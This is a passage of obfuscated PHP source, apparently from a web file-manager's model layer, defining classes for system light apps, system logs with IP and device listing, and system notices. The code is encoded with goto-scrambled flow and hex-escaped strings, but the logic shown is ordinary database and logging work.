str_replace(array($bß‘Ã¶‡ãÀ[93], $bß‘Ã¶‡ãÀ[4], $bß‘Ã¶‡ãÀ[180], $bß‘Ã¶‡ãÀ[69], $bß‘Ã¶‡ãÀ[113], $bß‘Ã¶‡ãÀ[928], $bß‘Ã¶‡ãÀ[931], $bß‘Ã¶‡ãÀ[275]), $bß‘Ã¶‡ãÀ[70], $c´ÍŠÀ¶í); } } goto f…ŒˆÑá©ó; A¨Š¸¡ÍŠ×: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\x4c\151\x67\150\x74\101\x70\x70"; public $modelType = "\123\171\163\164\x65\155\117\160\x74\151\157\156"; public $field = array("\156\x61\x6d\x65", "\x67\162\x6f\x75\160", "\x64\x65\x73\x63", "\x63\x6f\x6e\164\x65\156\164"); public function listData($fÎİñ›ÀÀò = false, $FŞ‰ç‡Œ¾© = "\155\x6f\x64\151\x66\x79\124\151\x6d\x65", $b‹İíÆï æ = true) { return parent::listData($fÎİñ›ÀÀò, $FŞ‰ç‡Œ¾©, $b‹İíÆï æ); } public function remove($E›ÍĞÓêåÎ) { $eĞõÁÁÅ¬” = $this->findByName($E›ÍĞÓêåÎ); if (!$eĞõÁÁÅ¬”) { return !1; } return parent::remove($eĞõÁÁÅ¬”[$_SERVER[‡’¶øåüç˜][371]]); } public function add($dçŒÙãÚ‰æ) { if ($this->findByName($dçŒÙãÚ‰æ[$_SERVER[‡’¶øåüç˜][28]])) { return !1; } return parent::insert($dçŒÙãÚ‰æ); } public function update($d¸Úî¥é²Ä, $Cáºšé’·Ó) { $f¡ãÍŞìá =& $_SERVER[‡’¶øåüç˜]; $e°Ô¦ÕŒ‰ = $this->findByName($d¸Úî¥é²Ä); $a§ƒÛ©„à´ = $this->findByName($Cáºšé’·Ó[$f¡ãÍŞìá[28]]); if (!$e°Ô¦ÕŒ‰ || $a§ƒÛ©„à´ && $a§ƒÛ©„à´[$f¡ãÍŞìá[371]] != $e°Ô¦ÕŒ‰[$f¡ãÍŞìá[371]]) { return !1; } return parent::update($e°Ô¦ÕŒ‰[$f¡ãÍŞìá[371]], $Cáºšé’·Ó); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\x54\x69\155\x65", "\x74\x69\x6d\145", "\151\156\x73\x65\162\x74", "\146\x75\x6e\x63\164\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $f…·ÅÑãé´ =& $_SERVER[‡’¶øåüç˜]; return array($f…·ÅÑãé´[2414] => LNG($f…·ÅÑãé´[2415]), $f…·ÅÑãé´[2416] => LNG($f…·ÅÑãé´[2417]), $f…·ÅÑãé´[2051] => LNG($f…·ÅÑãé´[2418]), $f…·ÅÑãé´[2419] => LNG($f…·ÅÑãé´[2420]), $f…·ÅÑãé´[2421] => LNG($f…·ÅÑãé´[2422]), $f…·ÅÑãé´[2423] => LNG($f…·ÅÑãé´[2424]), $f…·ÅÑãé´[2425] => LNG($f…·ÅÑãé´[2426]), $f…·ÅÑãé´[2427] => LNG($f…·ÅÑãé´[2428]), $f…·ÅÑãé´[2429] => LNG($f…·ÅÑãé´[2430]), $f…·ÅÑãé´[2082] => LNG($f…·ÅÑãé´[2430]), $f…·ÅÑãé´[2083] => LNG($f…·ÅÑãé´[2431]), $f…·ÅÑãé´[2432] => LNG($f…·ÅÑãé´[2433]), $f…·ÅÑãé´[2434] => LNG($f…·ÅÑãé´[2435]), $f…·ÅÑãé´[2436] => LNG($f…·ÅÑãé´[2437]), $f…·ÅÑãé´[2438] => LNG($f…·ÅÑãé´[2439]), $f…·ÅÑãé´[2080] => LNG($f…·ÅÑãé´[2440]), $f…·ÅÑãé´[2087] => LNG($f…·ÅÑãé´[2441]), $f…·ÅÑãé´[2442] => LNG($f…·ÅÑãé´[2443]), $f…·ÅÑãé´[2444] => LNG($f…·ÅÑãé´[2445]), $f…·ÅÑãé´[2446] => LNG($f…·ÅÑãé´[2447]), $f…·ÅÑãé´[2448] => LNG($f…·ÅÑãé´[2449]), $f…·ÅÑãé´[2090] => LNG($f…·ÅÑãé´[2450]), $f…·ÅÑãé´[2091] => LNG($f…·ÅÑãé´[2451]), $f…·ÅÑãé´[2452] => LNG($f…·ÅÑãé´[2453]), $f…·ÅÑãé´[2454] => LNG($f…·ÅÑãé´[2455]), $f…·ÅÑãé´[2456] => LNG($f…·ÅÑãé´[2457]), $f…·ÅÑãé´[2085] => LNG($f…·ÅÑãé´[2458]), $f…·ÅÑãé´[2459] => LNG($f…·ÅÑãé´[2460]), $f…·ÅÑãé´[2084] => LNG($f…·ÅÑãé´[2461]), $f…·ÅÑãé´[2462] => LNG($f…·ÅÑãé´[2463]), $f…·ÅÑãé´[2464] => LNG($f…·ÅÑãé´[2465]), $f…·ÅÑãé´[2466] => LNG($f…·ÅÑãé´[2466]), $f…·ÅÑãé´[2467] => LNG($f…·ÅÑãé´[2055]), $f…·ÅÑãé´[2468] => LNG($f…·ÅÑãé´[2469]), $f…·ÅÑãé´[2470] => LNG($f…·ÅÑãé´[2471]), $f…·ÅÑãé´[2472] => LNG($f…·ÅÑãé´[2473]), $f…·ÅÑãé´[2474] => LNG($f…·ÅÑãé´[2475]), $f…·ÅÑãé´[2476] => LNG($f…·ÅÑãé´[2477]), $f…·ÅÑãé´[2478] => LNG($f…·ÅÑãé´[2478]), $f…·ÅÑãé´[2479] => LNG($f…·ÅÑãé´[2480]), $f…·ÅÑãé´[2481] => LNG($f…·ÅÑãé´[2482]), $f…·ÅÑãé´[2483] => LNG($f…·ÅÑãé´[2484]), $f…·ÅÑãé´[2485] => LNG($f…·ÅÑãé´[2486]), $f…·ÅÑãé´[2487] => LNG($f…·ÅÑãé´[2488]), $f…·ÅÑãé´[2489] => LNG($f…·ÅÑãé´[2490])); } private function typeFile() { $fŠ¼ĞÍŒ’ =& $_SERVER[‡’¶øåüç˜]; $F®ÉƒÍ¸œ­ = array($fŠ¼ĞÍŒ’[2087] => array($fŠ¼ĞÍŒ’[2088]), $fŠ¼ĞÍŒ’[2436] => array($fŠ¼ĞÍŒ’[2491]), $fŠ¼ĞÍŒ’[2438] => array($fŠ¼ĞÍŒ’[2492]), $fŠ¼ĞÍŒ’[2080] => array($fŠ¼ĞÍŒ’[2081]), $fŠ¼ĞÍŒ’[2444] => array(), $fŠ¼ĞÍŒ’[2446] => array(), $fŠ¼ĞÍŒ’[2448] => array(), $fŠ¼ĞÍŒ’[2090] => array($fŠ¼ĞÍŒ’[2092]), $fŠ¼ĞÍŒ’[2091] => array($fŠ¼ĞÍŒ’[2092]), $fŠ¼ĞÍŒ’[2452] => array($fŠ¼ĞÍŒ’[2493]), $fŠ¼ĞÍŒ’[2454] => array($fŠ¼ĞÍŒ’[2493]), $fŠ¼ĞÍŒ’[2456] => array($fŠ¼ĞÍŒ’[2494]), $fŠ¼ĞÍŒ’[2442] => array($fŠ¼ĞÍŒ’[2495]), $fŠ¼ĞÍŒ’[2085] => array($fŠ¼ĞÍŒ’[2496]), $fŠ¼ĞÍŒ’[2459] => array($fŠ¼ĞÍŒ’[2497]), $fŠ¼ĞÍŒ’[2084] => array($fŠ¼ĞÍŒ’[2086])); return $F®ÉƒÍ¸œ­; } private function typeAll() { goto a®‹…‹•…; a®‹…‹•…: $D‰ÆÉà‰ß— =& $_SERVER[‡’¶øåüç˜]; $fä÷ŸÚã¿¹ = $this->typeList; $d×È«ïÇ» = array_filter($this->typeFile()); goto DÔÎÒò˜ğœ; A•ô´Ø‹¼: return $fä÷ŸÚã¿¹; goto Fõç‰”Â„‚; DÔÎÒò˜ğœ: foreach ($d×È«ïÇ» as $dæ˜„ãáÉã => $aóù‚—Å•) { $fä÷ŸÚã¿¹[$aóù‚—Å•[0]] = $fä÷ŸÚã¿¹[$dæ˜„ãáÉã]; } $fä÷ŸÚã¿¹[$D‰ÆÉà‰ß—[2092]] = LNG($D‰ÆÉà‰ß—[2498]); $fä÷ŸÚã¿¹[$D‰ÆÉà‰ß—[2493]] = LNG($D‰ÆÉà‰ß—[2499]); goto A•ô´Ø‹¼; Fõç‰”Â„‚: } public function addLog($F´¶‹£¼øå, $AØ­”“‰Õ† = array()) { goto cŞ¥º¨²Æ§; Fˆ÷ÛÅ›¡: if (!$F‡®ê¹Š°î) { $F‡®ê¹Š°î = (int) Session::get($fÚšœ·Œ–”[2232]); } $F¡æ£¡ = get_client_ip(); if (!$AØ­”“‰Õ† || strlen(json_encode($AØ­”“‰Õ†)) >= 1024) { $AØ­”“‰Õ† = array($fÚšœ·Œ–”[2500] => $F¡æ£¡); } else { if (is_array($AØ­”“‰Õ†)) { $AØ­”“‰Õ†[$fÚšœ·Œ–”[2500]] = $F¡æ£¡; } else { $AØ­”“‰Õ† = array($fÚšœ·Œ–”[1042] => $AØ­”“‰Õ†, $fÚšœ·Œ–”[2500] => $F¡æ£¡); } } goto f¶É´ãƒ; cŞ¥º¨²Æ§: $fÚšœ·Œ–” =& $_SERVER[‡’¶øåüç˜]; if (!isset($this->typeList[$F´¶‹£¼øå])) { return; } $F‡®ê¹Š°î = defined($fÚšœ·Œ–”[438]) && USER_ID ? USER_ID : (isset($AØ­”“‰Õ†[$fÚšœ·Œ–”[1443]]) ? $AØ­”“‰Õ†[$fÚšœ·Œ–”[1443]] : 0); goto Fˆ÷ÛÅ›¡; f¶É´ãƒ: $AØ­”“‰Õ† = array($fÚšœ·Œ–”[1433] => Session::sign(), $fÚšœ·Œ–”[1434] => $F‡®ê¹Š°î, $fÚšœ·Œ–”[29] => $F´¶‹£¼øå, $fÚšœ·Œ–”[1436] => json_encode($AØ­”“‰Õ†)); parent::add($AØ­”“‰Õ†); goto C«†‹¸¸œˆ; C«†‹¸¸œˆ: } public function remove($EÛÊ¡ö®Î) { $this->where(array($_SERVER[‡’¶øåüç˜][397] => $EÛÊ¡ö®Î))->delete(); } private function _makeOrder($E¥ìæÕãÅ÷ = '') { goto b©á¾¦¿Á·; b©á¾¦¿Á·: $bÛç¤»ÏÌ =& $_SERVER[‡’¶øåüç˜]; $c ËµğŒ•À = $bÛç¤»ÏÌ[191]; $cŠÏœ¯¬Â¹ = array($bÛç¤»ÏÌ[414] => $bÛç¤»ÏÌ[415], $bÛç¤»ÏÌ[416] => $bÛç¤»ÏÌ[417]); goto E×„ÏœÈŸ; e²Òã¾»‘è: return $this->order($E¥ìæÕãÅ÷); goto E†¿¾öß‹‹; E×„ÏœÈŸ: $eÒö‡¸ˆÑ = Input::get($bÛç¤»ÏÌ[420], $bÛç¤»ÏÌ[7], $bÛç¤»ÏÌ[2266], array($bÛç¤»ÏÌ[2192], $bÛç¤»ÏÌ[416])); $eÒö‡¸ˆÑ = $cŠÏœ¯¬Â¹[$eÒö‡¸ˆÑ]; $E¥ìæÕãÅ÷ = $E¥ìæÕãÅ÷ . "{$c ËµğŒ•À}\x20{$eÒö‡¸ˆÑ}"; goto e²Òã¾»‘è; E†¿¾öß‹‹: } public function get($aœÔó›Á«ò = '') { goto F’”›Ç˜Ë; AÌÓÚÜÒõŸ: if (!empty($aœÔó›Á«ò[$fÃµ¾¯å„ë[2500]])) { $EÆÁñÍ‚ï—[$fÃµ¾¯å„ë[417]] = array($fÃµ¾¯å„ë[757], "\x25{$aœÔó›Á«ò[$fÃµ¾¯å„ë[2500]]}\45"); } $f–‹£‚˜‹ = $this->_makeOrder()->where($EÆÁñÍ‚ï—)->selectPage(); if (empty($f–‹£‚˜‹[$fÃµ¾¯å„ë[358]])) { show_json(array(), !0, $f–‹£‚˜‹[$fÃµ¾¯å„ë[355]]); } goto DİªÊ½È¡; F’”›Ç˜Ë: $fÃµ¾¯å„ë =& $_SERVER[‡’¶øåüç˜]; if (!$aœÔó›Á«ò) { show_json(array()); } $EÆÁñÍ‚ï— = array(); goto B¿ÌêŠƒ¹; DİªÊ½È¡: $f–‹£‚˜‹[$fÃµ¾¯å„ë[358]] = $this->logList($f–‹£‚˜‹[$fÃµ¾¯å„ë[358]]); return $f–‹£‚˜‹; goto f‘¨Ÿğçô¨; B¿ÌêŠƒ¹: if ($aœÔó›Á«ò[$fÃµ¾¯å„ë[1443]]) { $EÆÁñÍ‚ï—[$fÃµ¾¯å„ë[1443]] = $aœÔó›Á«ò[$fÃµ¾¯å„ë[1443]]; } if (isset($aœÔó›Á«ò[$fÃµ¾¯å„ë[708]])) { $fÏ…Ö”Éº = $aœÔó›Á«ò[$fÃµ¾¯å„ë[708]]; $BéËëÜÅ = isset($aœÔó›Á«ò[$fÃµ¾¯å„ë[460]]) ? $aœÔó›Á«ò[$fÃµ¾¯å„ë[460]] : time(); $EÆÁñÍ‚ï—[$fÃµ¾¯å„ë[191]] = array($fÃµ¾¯å„ë[325], array($fÏ…Ö”Éº, $BéËëÜÅ)); } if ($aœÔó›Á«ò[$fÃµ¾¯å„ë[29]]) { $b“÷—ˆèˆ = explode($fÃµ¾¯å„ë[47], $aœÔó›Á«ò[$fÃµ¾¯å„ë[29]]); $A±ê¨å¸¿ = $this->typeFile(); $C­÷Í´®³¾ = array(); foreach ($b“÷—ˆèˆ as $E¢ æÉŸ ) { $C­÷Í´®³¾[] = $E¢ æÉŸ ; if (isset($A±ê¨å¸¿[$E¢ æÉŸ ])) { $C­÷Í´®³¾ = array_merge($C­÷Í´®³¾, $A±ê¨å¸¿[$E¢ æÉŸ ]); } } $C­÷Í´®³¾ = array_unique($C­÷Í´®³¾); if ($C­÷Í´®³¾) { $EÆÁñÍ‚ï—[$fÃµ¾¯å„ë[29]] = array($fÃµ¾¯å„ë[7], $C­÷Í´®³¾); } } goto AÌÓÚÜÒõŸ; f‘¨Ÿğçô¨: } private function ipAddress(&$A¡êÂé») { $B×ÔŠÕá„ì =& $_SERVER[‡’¶øåüç˜]; if (!empty($A¡êÂé»[$B×ÔŠÕá„ì[2500]])) { $bË¦ëàéŸ = IpLocation::get($A¡êÂé»[$B×ÔŠÕá„ì[2500]]); } else { $bË¦ëàéŸ = LNG($B×ÔŠÕá„ì[2501]); } $A¡êÂé»[$B×ÔŠÕá„ì[2502]] = $bË¦ëàéŸ; } private function descZipDownload($f˜‘ÄâÑ¾, &$F­ô¸ğŞì) { $cö¨•°Õ” =& $_SERVER[‡’¶øåüç˜]; if (!isset($f˜‘ÄâÑ¾[$cö¨•°Õ”[2503]])) { return; } $A‚šàÄŠä = json_decode($f˜‘ÄâÑ¾[$cö¨•°Õ”[2503]], !0); foreach ($A‚šàÄŠä as $dóª¬­¡«) { if (!IO::init($dóª¬­¡«[$cö¨•°Õ”[75]])) { continue; } if (!($dœ¬ß‡®á = IO::infoFull($dóª¬­¡«[$cö¨•°Õ”[75]]))) { continue; } $f˜‘ÄâÑ¾[$cö¨•°Õ”[75]] = $dóª¬­¡«[$cö¨•°Õ”[75]]; $F­ô¸ğŞì[] = $f˜‘ÄâÑ¾[$cö¨•°Õ”[381]] = $dœ¬ß‡®á[$cö¨•°Õ”[381]]; $F­ô¸ğŞì[] = $f˜‘ÄâÑ¾[$cö¨•°Õ”[2321]] = $dœ¬ß‡®á[$cö¨•°Õ”[474]]; break; } return $f˜‘ÄâÑ¾; } private function getSourceList(&$e‹ŒÔ–‡ª) { $C³ÎŒŒˆÜ… =& $_SERVER[‡’¶øåüç˜]; $aâßÄ™Š•Œ = array(); foreach ($e‹ŒÔ–‡ª as $bÙ²ï¸óæ– => $døÔ¼Öğ«‘) { goto dßƒá£Ëô; F§µê¬—À: if ($AÒË˜—œî“[$C³ÎŒŒˆÜ…[29]] == $C³ÎŒŒˆÜ…[2329]) { $aâßÄ™Š•Œ[] = $AÒË˜—œî“[$C³ÎŒŒˆÜ…[417]][$C³ÎŒŒˆÜ…[381]]; } goto DÖßäÂÛ·»; dßƒá£Ëô: $AÒË˜—œî“ = json_decode($døÔ¼Öğ«‘[$C³ÎŒŒˆÜ…[417]], !0); if ($døÔ¼Öğ«‘[$C³ÎŒŒˆÜ…[29]] == $C³ÎŒŒˆÜ…[2083]) { $AÒË˜—œî“ = $this->descZipDownload($AÒË˜—œî“, $aâßÄ™Š•Œ); $e‹ŒÔ–‡ª[$bÙ²ï¸óæ–][$C³ÎŒŒˆÜ…[417]] = json_encode($AÒË˜—œî“); continue; } if (strpos($døÔ¼Öğ«‘[$C³ÎŒŒˆÜ…[29]], $C³ÎŒŒˆÜ…[2322]) !== 0) { goto e›Ş˜¯›ˆ”; f‚ÒİÛÑ: $aâßÄ™Š•Œ[] = $AÒË˜—œî“[$C³ÎŒŒˆÜ…[381]] = $e•‰óÖİã[$C³ÎŒŒˆÜ…[381]]; $aâßÄ™Š•Œ[] = $AÒË˜—œî“[$C³ÎŒŒˆÜ…[2321]] = $e•‰óÖİã[$C³ÎŒŒˆÜ…[474]]; $e‹ŒÔ–‡ª[$bÙ²ï¸óæ–][$C³ÎŒŒˆÜ…[417]] = json_encode($AÒË˜—œî“); goto DÅ§Ï¸èª; e›Ş˜¯›ˆ”: if (!isset($AÒË˜—œî“[$C³ÎŒŒˆÜ…[75]]) || strpos($døÔ¼Öğ«‘[$C³ÎŒŒˆÜ…[29]], $C³ÎŒŒˆÜ…[2504]) !== 0) { continue; } if (!IO::init($AÒË˜—œî“[$C³ÎŒŒˆÜ…[75]])) { continue; } if (!($e•‰óÖİã = IO::infoFull($AÒË˜—œî“[$C³ÎŒŒˆÜ…[75]]))) { continue; } goto f‚ÒİÛÑ; DÅ§Ï¸èª: continue; goto AÕó Ò­¾°; AÕó Ò­¾°: } goto cÖ ÚÅÊÉº; cÖ ÚÅÊÉº: $aâßÄ™Š•Œ[] = $AÒË˜—œî“[$C³ÎŒŒˆÜ…[381]]; $aâßÄ™Š•Œ[] = $AÒË˜—œî“[$C³ÎŒŒˆÜ…[2321]]; if ($AÒË˜—œî“[$C³ÎŒŒˆÜ…[29]] == $C³ÎŒŒˆÜ…[505]) { $aâßÄ™Š•Œ[] = $AÒË˜—œî“[$C³ÎŒŒˆÜ…[417]][$C³ÎŒŒˆÜ…[1011]]; $aâßÄ™Š•Œ[] = $AÒË˜—œî“[$C³ÎŒŒˆÜ…[417]][$C³ÎŒŒˆÜ…[1012]]; } goto F§µê¬—À; DÖßäÂÛ·»: } if (!$aâßÄ™Š•Œ) { return array(); } return Model($C³ÎŒŒˆÜ…[758])->sourceListInfo($aâßÄ™Š•Œ, !0); } private function logList($DÇª¶®ÒáÈ) { goto a†¨á»ÊØ; b¿·¯Å©Ûœ: return $cÀ‘ˆÃğÕ”; goto d§‹É’ç; B˜º‰¦ÇÆÇ: $bÍ¡±ä¹‰ = $this->getSourceList($DÇª¶®ÒáÈ); $e—×¶“÷è³ = $this->typeAll(); $cÀ‘ˆÃğÕ” = array(); goto dè£ó†­Œ§; dè£ó†­Œ§: $f¶¯…ÂÆå¸ = array(); foreach ($DÇª¶®ÒáÈ as $eº–Ò†Ö˜º => $B‚á£ÇŞ°ò) { goto eêâíÀ¨˜«; eêâíÀ¨˜«: $f¾¶‰ˆæí = $B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[29]]; $a›¹Äß°ö = isset($E÷ÊÆ±ÈñÁ[$B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[1443]]]) ? $E÷ÊÆ±ÈñÁ[$B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[1443]]] : !1; $bŠ×·ï‘‡ = strpos($f¾¶‰ˆæí, $EŸ”¶¯¯ß•[2505]) === 0 ? LNG($EŸ”¶¯¯ß•[2506]) : LNG($EŸ”¶¯¯ß•[2501]); goto eËê³˜»ÔÓ; eËê³˜»ÔÓ: $B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[28]] = isset($a›¹Äß°ö[$EŸ”¶¯¯ß•[28]]) ? $a›¹Äß°ö[$EŸ”¶¯¯ß•[28]] : LNG($EŸ”¶¯¯ß•[2501]); $B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[2370]] = isset($a›¹Äß°ö[$EŸ”¶¯¯ß•[2370]]) ? $a›¹Äß°ö[$EŸ”¶¯¯ß•[2370]] : $EŸ”¶¯¯ß•[33]; $B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[1348]] = isset($e—×¶“÷è³[$f¾¶‰ˆæí]) ? $e—×¶“÷è³[$f¾¶‰ˆæí] : $bŠ×·ï‘‡; goto cä‡ò¥ôô; cä‡ò¥ôô: $B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[2265]] = $a›¹Äß°ö; $dÛ£‘„ÄŠ = json_decode($B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[417]], !0); $B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[2500]] = isset($dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[2500]]) ? $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[2500]] : $EŸ”¶¯¯ß•[33]; goto fİ²„—ÀÛõ; F¬Æ¯÷§ÇË: unset($B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[2507]]); $cÀ‘ˆÃğÕ”[] = $B‚á£ÇŞ°ò; goto CÌÓºàÊ‹›; fİ²„—ÀÛõ: $this->ipAddress($B‚á£ÇŞ°ò); if (strpos($f¾¶‰ˆæí, $EŸ”¶¯¯ß•[2322]) === 0 || isset($dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[2321]])) { goto a¾ä•‰äÚß; a¾ä•‰äÚß: $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[403]] = $bÍ¡±ä¹‰[$dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[381]]]; $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[2334]] = $bÍ¡±ä¹‰[$dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[2321]]]; if ($dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[29]] == $EŸ”¶¯¯ß•[505]) { $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[417]][$EŸ”¶¯¯ß•[1011]] = $bÍ¡±ä¹‰[$dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[417]][$EŸ”¶¯¯ß•[1011]]]; $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[417]][$EŸ”¶¯¯ß•[1012]] = $bÍ¡±ä¹‰[$dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[417]][$EŸ”¶¯¯ß•[1012]]]; } goto AÄŒ™¶öˆ…; AÄŒ™¶öˆ…: if ($dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[29]] == $EŸ”¶¯¯ß•[2329]) { $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[417]][$EŸ”¶¯¯ß•[381]] = $bÍ¡±ä¹‰[$dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[417]][$EŸ”¶¯¯ß•[381]]]; } if ($dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[29]] == $EŸ”¶¯¯ß•[2078]) { $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[2334]] = $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[403]]; $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[2321]] = $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[2334]][$EŸ”¶¯¯ß•[381]]; $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[403]] = !1; $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[381]] = $EŸ”¶¯¯ß•[33]; } if ($dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[403]] && $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[403]][$EŸ”¶¯¯ß•[383]] == $EŸ”¶¯¯ß•[1087]) { $f¶¯…ÂÆå¸[] = $B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[371]]; unset($DÇª¶®ÒáÈ[$eº–Ò†Ö˜º]); continue; } goto Då†¤“À¯ ; Då†¤“À¯ : if ($dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[2334]] && $dÛ£‘„ÄŠ[$EŸ”¶¯¯ß•[2334]][$EŸ”¶¯¯ß•[383]] == $EŸ”¶¯¯ß•[1087]) { $f¶¯…ÂÆå¸[] = $B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[371]]; unset($DÇª¶®ÒáÈ[$eº–Ò†Ö˜º]); continue; } goto AÇöì¸Ôæ; AÇöì¸Ôæ: } $B‚á£ÇŞ°ò[$EŸ”¶¯¯ß•[417]] = $dÛ£‘„ÄŠ; goto F¬Æ¯÷§ÇË; CÌÓºàÊ‹›: } $this->clearSystemPathLog($f¶¯…ÂÆå¸); goto b¿·¯Å©Ûœ; a†¨á»ÊØ: $EŸ”¶¯¯ß• =& $_SERVER[‡’¶øåüç˜]; $a¥¯¼ƒÌ±® = array_to_keyvalue($DÇª¶®ÒáÈ, $EŸ”¶¯¯ß•[33], $EŸ”¶¯¯ß•[1443]); $E÷ÊÆ±ÈñÁ = Model($EŸ”¶¯¯ß•[490])->userListInfo(array_unique($a¥¯¼ƒÌ±®)); goto B˜º‰¦ÇÆÇ; d§‹É’ç: } private function clearSystemPathLog($F¯™‹‘Ş‘­) { $C«Æ½„õï =& $_SERVER[‡’¶øåüç˜]; if (count($F¯™‹‘Ş‘­) == 0) { return; } $D§¨·„µœÏ = array($C«Æ½„õï[371] => array($C«Æ½„õï[7], array_unique($F¯™‹‘Ş‘­))); $this->where($D§¨·„µœÏ)->delete(); } public function deviceList($Aç—ôèŞ’, $c›Åö¨ÄÙ§ = 0) { $fÍ¥è‡äÛ =& $_SERVER[‡’¶øåüç˜]; $DšÜ¢‰ Æó = array($fÍ¥è‡äÛ[1443] => $Aç—ôèŞ’, $fÍ¥è‡äÛ[191] => array($fÍ¥è‡äÛ[931], $c›Åö¨ÄÙ§), $fÍ¥è‡äÛ[29] => $fÍ¥è‡äÛ[2051]); $eğ›ùÍ—è = array(); $B¿®£éÅÆ = $this->field($fÍ¥è‡äÛ[2508])->where($DšÜ¢‰ Æó)->order($fÍ¥è‡äÛ[2332])->limit(50)->select(); foreach ($B¿®£éÅÆ as $dÔì©¬„ => $BÙµñËŠ½ø) { goto CğÍÄªØ¸™; CğÍÄªØ¸™: if ($dÔì©¬„ > 0 && abs($BÙµñËŠ½ø[$fÍ¥è‡äÛ[191]] - $B¿®£éÅÆ[$dÔì©¬„ - 1][$fÍ¥è‡äÛ[191]]) < 5) { continue; } $BøÆÚœŠÈ = json_decode($BÙµñËŠ½ø[$fÍ¥è‡äÛ[417]], !0); $BÙµñËŠ½ø[$fÍ¥è‡äÛ[2500]] = isset($BøÆÚœŠÈ[$fÍ¥è‡äÛ[2500]]) ? $BøÆÚœŠÈ[$fÍ¥è‡äÛ[2500]] : $fÍ¥è‡äÛ[33]; goto bá…õè†¾Å; bá…õè†¾Å: unset($BøÆÚœŠÈ[$fÍ¥è‡äÛ[2500]]); $a›¸¦‹ŞÚ“ = $this->deviceType($BøÆÚœŠÈ[$fÍ¥è‡äÛ[2323]]); if (isset($eğ›ùÍ—è[$a›¸¦‹ŞÚ“])) { continue; } goto añÉÄÔ¼÷; añÉÄÔ¼÷: $this->ipAddress($BÙµñËŠ½ø); $BÙµñËŠ½ø[$fÍ¥è‡äÛ[417]] = $BøÆÚœŠÈ; $eğ›ùÍ—è[$a›¸¦‹ŞÚ“] = $BÙµñËŠ½ø; goto bè¤†ß×; bè¤†ß×: } return array_values($eğ›ùÍ—è); } public function deviceType($c‚‚Ù…Áù) { return $c‚‚Ù…Áù; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\156\x6f\164\x69\x63\145\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\143\157\156\x74\x65\156\x74", "\x61\165\x74\150", "\155\157\x64\145", "\164\x69\155\145", "\x74\x79\x70\145", "\154\145\166\x65\154", "\x65\x6e\x61\x62\x6c\145", "\163\157\162\164"); public function listData($a×…‡ßÁàŞ = false, $dØ¹çŞ¥í = "\163\157\x72\164", $f©‘î”¦Ãµ = false) { return parent::listData($a×…‡ßÁàŞ, $dØ¹çŞ¥í, $f©‘î”¦Ãµ); } public function add($f´ÆÛ¡†) { $A»ñ¢˜ŒŞ‰ =& $_SERVER[‡’¶øåüç˜]; $C£Şñ—öíÀ = time(); if ($f´ÆÛ¡†[$A»ñ¢˜ŒŞ‰[12]] == $A»ñ¢˜ŒŞ‰[2509]) { $C£Şñ—öíÀ = strtotime($f´ÆÛ¡†[$A»ñ¢˜ŒŞ‰[194]]); } $f´ÆÛ¡†[$A»ñ¢˜ŒŞ‰[194]] = $C£Şñ—öíÀ; return parent::insert($f´ÆÛ¡†); } public function update($aïöò…‚Åö, $Bâƒ¸‚†¸ß) { goto DÄÊ×Ù¼”©; DÆ’øà‹Ÿ°: return parent::update($aïöò…‚Åö, $Bâƒ¸‚†¸ß); goto c™´Šä‘¾; DÄÊ×Ù¼”©: $FùªÁŸÁ =& $_SERVER[‡’¶øåüç˜]; $AØÂŸÒñ­Ì = $this->listData($aïöò…‚Åö); if (!$AØÂŸÒñ­Ì) { return !1; } goto e¯ƒ ÖÒßµ; e¯ƒ ÖÒßµ: $eà£“¯Ê´ = time(); if ($Bâƒ¸‚†¸ß[$FùªÁŸÁ[12]] == $FùªÁŸÁ[2509]) { $eà£“¯Ê´ = strtotime($Bâƒ¸‚†¸ß[$FùªÁŸÁ[194]]); } $Bâƒ¸‚†¸ß[$FùªÁŸÁ[194]] = $eà£“¯Ê´; goto DÆ’øà‹Ÿ°; c™´Šä‘¾: } public function remove($Dù‹Ÿ»ØŠ¼) { $eù…™ÛÍÆ = $this->listData($Dù‹Ÿ»ØŠ¼); if 